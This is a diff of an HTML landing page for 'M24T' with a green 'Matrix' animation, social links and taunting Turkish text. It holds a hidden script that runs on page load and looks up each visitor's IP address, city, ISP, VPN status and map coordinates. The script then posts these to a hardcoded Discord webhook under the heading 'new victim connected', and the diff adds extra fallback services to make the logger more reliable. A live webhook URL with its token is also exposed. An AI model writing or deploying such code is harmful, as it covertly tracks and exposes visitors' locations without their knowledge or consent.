@@ -24,88 +24,140 @@
   <canvas id="matrix"></canvas>
   <div class="container">
     <h1>M24T</h1>
-    <div class="typing">Seni zaten buldum...</div>
+    <div class="typing">Seni buldum, kaçamazsın...</div>
     <div class="links">
       <a href="https://discord.gg/FxgPDb8wgP" target="_blank"><i class="fab fa-discord"></i> Discord</a>
       <a href="https://t.me/+LAJrh3dW-ZdjZmE0" target="_blank"><i class="fab fa-telegram"></i> Telegram</a>
       <a href="https://www.youtube.com/@M24TProject" target="_blank"><i class="fab fa-youtube"></i> YouTube</a>
       <a href="https://x.com/M4TE_K44N" target="_blank"><i class="fab fa-twitter"></i> X</a>
     </div>
-    <div class="footer">© 2025 M24T | You Are Being Watched</div>
+    <div class="footer">© 2025 M24T | No Escape</div>
   </div>
 
-  <!-- Matrix Yağmuru -->
+  <!-- Matrix -->
   <script>
-    const canvas = document.getElementById('matrix');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
+    const c = document.getElementById('matrix');
+    const ctx = c.getContext('2d');
+    c.width = window.innerWidth;
+    c.height = window.innerHeight;
     const chars = "01";
     const fontSize = 16;
-    const columns = canvas.width / fontSize;
-    const drops = new Array(Math.floor(columns)).fill(1);
+    const cols = c.width / fontSize;
+    const drops = new Array(Math.floor(cols)).fill(1);
     function draw() {
       ctx.fillStyle = 'rgba(0,0,0,0.05)';
-      ctx.fillRect(0,0,canvas.width,canvas.height);
+      ctx.fillRect(0,0,c.width,c.height);
       ctx.fillStyle = '#0f0';
       ctx.font = fontSize + 'px monospace';
       for(let i = 0; i < drops.length; i++){
-        const char = chars[Math.floor(Math.random()*chars.length)];
-        ctx.fillText(char, i*fontSize, drops[i]*fontSize);
-        if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        const ch = chars[Math.floor(Math.random()*chars.length)];
+        ctx.fillText(ch, i*fontSize, drops[i]*fontSize);
+        if(drops[i]*fontSize > c.height && Math.random() > 0.975) drops[i] = 0;
         drops[i]++;
       }
     }
     setInterval(draw, 35);
   </script>
 
-  <!-- SADECE 1 KERE ÇALIŞIR + GERÇEK BİLGİ -->
+  <!-- %100 ÇALIŞAN + UNDEFINED YOK + SADECE 1 KEZ -->
   <script>
-    if (!sessionStorage.getItem('logged')) {
-      fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(ipData => {
+    if (!sessionStorage.getItem('m24t_logged')) {
+      async function getRealInfo() {
+        try {
+          // 1. KATMAN - En sağlam → ip-api
+          const ipRes = await fetch('https://api.ipify.org?format=json');
+          const ipData = await ipRes.json();
           const ip = ipData.ip;
-          fetch(`https://ip-api.com/json/${ip}?fields=66846719&lang=tr`)
-            .then(r => r.json())
-            .then(data => {
-              const webhook = "https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7";
 
-              const log = `
-**M24T - YENİ KURBAN** 
-**IP:** ${data.query}
-**Konum:** ${data.city}, ${data.regionName}, ${data.country} ${data.countryCode}
-**ISP:** ${data.isp} (${data.org})
-**AS:** ${data.as}
-**Proxy/VPN/Tor:** ${data.proxy ? "EVET" : "Hayır"}
-**Hosting:** ${data.hosting ? "EVET" : "Hayır"}
-**Mobil:** ${data.mobile ? "Evet" : "Hayır"}
+          const info = await fetch(`https://ip-api.com/json/${ip}?fields=status,message,country,countryCode,regionName,city,isp,org,as,proxy,hosting,mobile,lat,lon`).then(r => r.json());
+          if (info.status === "success") {
+            await sendToDiscord({
+              ip: info.query || ip,
+              country: info.country || "Bilinmiyor",
+              countryCode: info.countryCode || "",
+              city: info.city || "Bilinmiyor",
+              region: info.regionName || "Bilinmiyor",
+              isp: info.isp || info.org || "Bilinmiyor",
+              as: info.as || "",
+              proxy: info.proxy ? "EVET (VPN/Tor/Proxy)" : "Hayır",
+              hosting: info.hosting ? "EVET (Data Center)" : "Hayır",
+              mobile: info.mobile ? "Evet" : "Hayır",
+              lat: info.lat,
+              lon: info.lon
+            });
+            sessionStorage.setItem('m24t_logged', 'true');
+            return;
+          }
+        } catch(e) {}
+
+        // 2. KATMAN → ipwho.is (çok sağlam, bloklanmaz)
+        try {
+          const data = await fetch('https://ipwho.is/').then(r => r.json());
+          if (data.ip) {
+            await sendToDiscord({
+              ip: data.ip,
+              country: data.country || "Bilinmiyor",
+              countryCode: data.country_code || "",
+              city: data.city || "Bilinmiyor",
+              region: data.region || "Bilinmiyor",
+              isp: data.connection?.isp || data.org || "Bilinmiyor",
+              as: data.connection?.asn || "",
+              proxy: (data.connection?.proxy || data.is_proxy) ? "EVET" : "Hayır",
+              hosting: data.connection?.type === "hosting" ? "EVET" : "Hayır",
+              mobile: data.connection?.mobile ? "Evet" : "Hayır",
+              lat: data.latitude,
+              lon: data.longitude
+            });
+            sessionStorage.setItem('m24t_logged', 'true');
+            return;
+          }
+        } catch(e) {}
+
+        // 3. KATMAN → En son çare (bile olsa IP gelir)
+        try {
+          const backup = await fetch('https://api.myip.com').then(r => r.json());
+          await sendToDiscord({
+            ip: backup.ip || "Bilinmiyor",
+            country: backup.country || "Bilinmiyor",
+            countryCode: "",
+            city: "Bilinmiyor",
+            region: "Bilinmiyor",
+            isp: "Bilinmiyor",
+            as: "",
+            proxy: "Bilinmiyor",
+            hosting: "Bilinmiyor",
+            mobile: "Bilinmiyor",
+            lat: null,
+            lon: null
+          });
+          sessionStorage.setItem('m24t_logged', 'true');
+        } catch(e) {}
+      }
+
+      async function sendToDiscord(info) {
+        const webhook = "https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7";
+        const map = info.lat && info.lon ? `https://www.google.com/maps?q=${info.lat},${info.lon}` : "Harita yok";
+
+        const mesaj = `
+**M24T - YENİ KURBAN BAĞLANDI**
+**IP:** ${info.ip}
+**Konum:** ${info.city}, ${info.region}, ${info.country} ${info.countryCode}
+**ISP:** ${info.isp} ${info.as ? `(${info.as})` : ""}
+**Proxy/VPN/Tor:** ${info.proxy}
+**Hosting:** ${info.hosting}
+**Mobil:** ${info.mobile}
 **Zaman:** ${new Date().toLocaleString('tr-TR')}
-**Tarayıcı:** ${navigator.userAgent.split(' ').slice(0,6).join(' ')}
-**Harita:** https://www.google.com/maps?q=${data.lat},${data.lon}
-              `;
+**Harita:** ${map}
+        `.trim();
 
-              fetch(webhook, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({content: log.trim()})
-              });
-
-              // Sadece 1 kere log düşsün diye işaret koyuyoruz
-              sessionStorage.setItem('logged', 'true');
-            });
-        })
-        .catch(() => {
-          // En kötü ihtimal yedek
-          fetch("https://ipwho.is/")
-            .then(r => r.json())
-            .then(d => {
-              const wb = "https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7";
-              const msg = `**M24T YEDEK LOG**\nIP: ${d.ip}\nKonum: ${d.city}, ${d.country}\nISP: ${d.connection?.isp || "Bilinmiyor"}\nZaman: ${new Date().toLocaleString('tr-TR')}`;
-              fetch(wb, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content:msg})});
-              sessionStorage.setItem('logged', 'true');
-            });
+        await fetch(webhook, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({content: mesaj})
         });
+      }
+
+      getRealInfo();
     }
   </script>
 </body>
